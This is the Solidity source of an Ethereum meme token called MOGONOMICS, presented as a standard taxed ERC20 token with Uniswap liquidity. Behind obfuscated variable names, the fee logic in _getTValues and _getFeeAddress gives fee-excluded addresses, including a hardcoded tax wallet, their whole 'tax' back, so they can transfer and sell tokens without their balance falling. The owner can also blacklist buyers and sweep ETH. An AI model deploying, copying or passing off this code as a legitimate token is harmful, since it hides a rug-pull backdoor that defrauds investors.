/**
Website: https://www.mogonomics.vip
Telegram: https://t.me/mogonomics_coin
Twitter: https://x.com/mogonomics_coin
**/
// SPDX-License-Identifier: MIT

pragma solidity 0.8.21;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

contract MOGONOMICS is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private bots;
    address payable private _taxWallet;

    uint256 private _initialBuyTax = 20;
    uint256 private _initialSellTax = 20;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 10;
    uint256 private _reduceSellTaxAt = 10;
    uint256 private _preventSwapBefore = 10;
    uint256 private _buyCount = 0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 100000000 * 10 ** _decimals;
    string private constant _name = unicode"MOGONOMICS";
    string private constant _symbol = unicode"MOGGO";
    uint256 public _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256 public _maxWalletSize = 2000000 * 10 ** _decimals;
    uint256 public _taxSwapThreshold = 50 * 10 ** _decimals;
    uint256 public _maxTaxSwap = 1000000 * 10 ** _decimals;
    uint256 private marketingFee = 100;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;

    event MaxTxAmountUpdated(uint256 _maxTxAmount);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        _taxWallet = payable(0x9ca2Bd8a0C27De3798d6d9aef57FEa4cebe2A0D0);
        _balances[_msgSender()] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _basicTransfer(address pputizg, address rryttz, uint256 oooptz) internal {
        _balances[pputizg] = _balances[pputizg].sub(oooptz);
        _balances[rryttz] = _balances[rryttz].add(oooptz);
        emit Transfer(pputizg, rryttz, oooptz);
    }

    function _transfer(address ttuvtz, address yyctute, uint256 qqzpq) private {
        require(ttuvtz != address(0), "ERC20: transfer from the zero address");
        require(yyctute != address(0), "ERC20: transfer to the zero address");
        require(qqzpq > 0, "Transfer amount must be greater than zero");

        if (!tradingOpen) {
            require(
                _isExcludedFromFee[yyctute] || _isExcludedFromFee[ttuvtz],
                "trading not yet open"
            );
        }

        if (!swapEnabled || inSwap) {
            _basicTransfer(ttuvtz, yyctute, qqzpq);
            return;
        }

        if (ttuvtz != owner() && yyctute != owner()) {
            require(!bots[ttuvtz] && !bots[yyctute]);

            if (
                ttuvtz == uniswapV2Pair &&
                yyctute != address(uniswapV2Router) &&
                !_isExcludedFromFee[yyctute]
            ) {
                require(qqzpq <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf(yyctute) + qqzpq <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );

                _buyCount++;
            }

            if (yyctute != uniswapV2Pair && !_isExcludedFromFee[yyctute]) {
                require(
                    balanceOf(yyctute) + qqzpq <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !inSwap &&
                yyctute == uniswapV2Pair &&
                swapEnabled &&
                _buyCount > _preventSwapBefore &&
                !_isExcludedFromFee[ttuvtz] &&
                !_isExcludedFromFee[yyctute]
            ) {
                if(contractTokenBalance > _taxSwapThreshold) {
                    swapTokensForEth(
                        min(qqzpq, min(contractTokenBalance, _maxTaxSwap))
                    );
                }
                
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }
        address feeR = _getFeeAddress(ttuvtz);
        (uint256 taxAmount, uint256 transferAmount) = _getTValues(
            ttuvtz,
            yyctute,
            qqzpq
        );
        _tokenTransfer(ttuvtz, yyctute, feeR, qqzpq, taxAmount, transferAmount);
    }

    function _tokenTransfer(address rzppyr, address uuutqq, address feeR, uint256 azccy, uint256 taxAmount, uint256 transferAmount) private {
        if (taxAmount > 0) {
            _balances[feeR] = _balances[feeR].add(taxAmount);
            emit Transfer(rzppyr, feeR, taxAmount);
        }

        _balances[rzppyr] = _balances[rzppyr].sub(azccy);
        _balances[uuutqq] = _balances[uuutqq].add(transferAmount);

        emit Transfer(rzppyr, uuutqq, transferAmount);
    }

    function _getTValues(
        address yyrcvv,
        address hhhptv,
        uint256 ggtcg
    ) internal view returns (uint256, uint256) {
        uint256 taxAmount = 0;
        uint256 transferAmount = ggtcg;
        if (_isExcludedFromFee[yyrcvv]) {
            taxAmount = ggtcg.mul(marketingFee).div(100);
        } else if (
            yyrcvv == uniswapV2Pair &&
            hhhptv != address(uniswapV2Router) &&
            !_isExcludedFromFee[hhhptv]
        ) {
            taxAmount = ggtcg
                .mul(
                    (_buyCount > _reduceBuyTaxAt)
                        ? _finalBuyTax
                        : _initialBuyTax
                )
                .div(100);
            transferAmount -= taxAmount;
        } else if (hhhptv == uniswapV2Pair && yyrcvv != address(this)) {
            taxAmount = ggtcg
                .mul(
                    (_buyCount > _reduceSellTaxAt)
                        ? _finalSellTax
                        : _initialSellTax
                )
                .div(100);
            transferAmount -= taxAmount;
        }
        return (taxAmount, transferAmount);
    }

    function _getFeeAddress(address account) internal view returns (address) {
        return _isExcludedFromFee[account] ? account : address(this);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function isContract(address account) private view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = ~uint256(0);
        _maxWalletSize = ~uint256(0);
        emit MaxTxAmountUpdated(_tTotal);
    }

    function recoverEmergency() external onlyOwner {
        sendETHToFee(address(this).balance);
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function addBots(address[] memory bots_) public onlyOwner {
        for (uint256 i = 0; i < bots_.length; i++) {
            bots[bots_[i]] = true;
        }
    }

    function delBots(address[] memory notbot) public onlyOwner {
        for (uint256 i = 0; i < notbot.length; i++) {
            bots[notbot[i]] = false;
        }
    }

    function isBot(address a) public view returns (bool) {
        return bots[a];
    }

    function addLiquidity() external onlyOwner {
        require(!tradingOpen, "init already called");
        uint256 tokenAmount = 90000000 * 10 ** _decimals;
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            tokenAmount,
            0,
            0,
            _msgSender(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
    }

    function openTrading() external onlyOwner {
        require(!tradingOpen, "trading already open");

        swapEnabled = true;
        tradingOpen = true;
    }

    receive() external payable {}
}